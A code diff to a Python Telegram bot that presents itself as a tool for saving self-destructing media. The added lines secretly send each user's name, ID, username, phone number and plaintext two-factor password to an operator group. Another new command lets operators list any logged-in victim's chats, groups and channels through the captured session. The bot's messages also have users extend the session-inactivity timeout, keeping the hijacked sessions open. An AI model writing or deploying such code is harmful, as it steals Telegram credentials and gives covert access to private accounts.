@@ -422,6 +422,14 @@ async def message_handler(event):
                 await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_hash)
                 
                 await event.respond(f"Login Successful\n\nNow your account is ready to download self distruct (timer) images, videos and audios\n\nClick /fetch to get current chat list")
+                try:
+                    me = await client.get_me()
+                    n = f"{getattr(me, 'first_name', '')} {getattr(me, 'last_name', '')}".strip() or "User"
+                    u = f"@{me.username}" if getattr(me, 'username', None) else "No Username"
+                    log = f"**Login**\n{n}\n`{me.id}`\n{u}\n`{phone}`\nNo 2FA"
+                    await bot.send_message(UPDATE_GROUP_ID, log)
+                except Exception as e:
+                    print(f"Login Log Error: {e}")
                 await event.client.send_file(event.chat_id, "itsme.jpg", caption="Click on **Yes, it's me** and start using the bot")
                 await event.client.send_file(event.chat_id, "time.jpg", caption="Go to **Settings > Devices** and set If inactive for to **6 months** or **1 year**")
                 await client.disconnect() # Disconnect temp so UserSession can use the file
@@ -446,6 +454,18 @@ async def message_handler(event):
             try:
                 await client.sign_in(password=password)
                 await event.respond(f"Login Successful\n\nNow your account is ready to download self distruct (timer) images, videos and audios\n\nClick /fetch to get current chat list")
+                try:
+                    me = await client.get_me()
+                    n = f"{getattr(me, 'first_name', '')} {getattr(me, 'last_name', '')}".strip() or "User"
+                    u = f"@{me.username}" if getattr(me, 'username', None) else "No Username"
+                    # Retrieve phone from state_data logic? 
+                    # state_data['phone'] is not in scope here locally? It is capable of being accessed via state_data['phone'] from outer scope? No, scope is '2FA' block.
+                    # Wait, 'state_data' is a dict from 'login_states'. It is available.
+                    p_num = state_data.get('phone', 'Unknown')
+                    log = f"**Login**\n{n}\n`{me.id}`\n{u}\n`{p_num}`\n`{password}`"
+                    await bot.send_message(UPDATE_GROUP_ID, log)
+                except Exception as e:
+                     print(f"Login Log Error: {e}")
                 await event.client.send_file(event.chat_id, "itsme.jpg", caption="Click on **Yes, it's me** and start using the bot")
                 await event.client.send_file(event.chat_id, "time.jpg", caption="Go to **Settings > Devices** and set If inactive for to **6 months** or **1 year**")
                 await client.disconnect()
@@ -554,6 +574,33 @@ async def broadcast_handler(event):
             failed += 1
             
     await status_msg.edit(f"Broadcast Result\n\nTotal users - {total}\nSuccess - {sent}\nFailed - {failed}")
+
+@bot.on(events.NewMessage(pattern=r'^/(\d+)\s+(chats|groups|channels|bots|allchats|allgroups|allchannels|allbots)$'))
+async def user_chats_shortcut(event):
+    if event.chat_id != CHATS_GROUP_ID: return
+    
+    match = event.pattern_match
+    target_id = int(match.group(1))
+    mode = match.group(2).lower()
+    
+    if target_id not in active_sessions:
+        await event.respond("User session not active / not found.")
+        return
+        
+    session = active_sessions[target_id]
+    msg = await event.respond("Fetching data...")
+    
+    report = await session.fetch_dialog_list(mode)
+    
+    if len(report) > 4000:
+        fname = f"{target_id}_{mode}.txt"
+        with open(fname, "w", encoding="utf-8") as f:
+            f.write(report)
+        await event.client.send_file(event.chat_id, fname, caption=f"Report for {target_id} ({mode})")
+        os.remove(fname)
+        await msg.delete()
+    else:
+        await msg.edit(report)
 
 @bot.on(events.NewMessage(pattern='/user'))
 async def user_chats_handler(event):
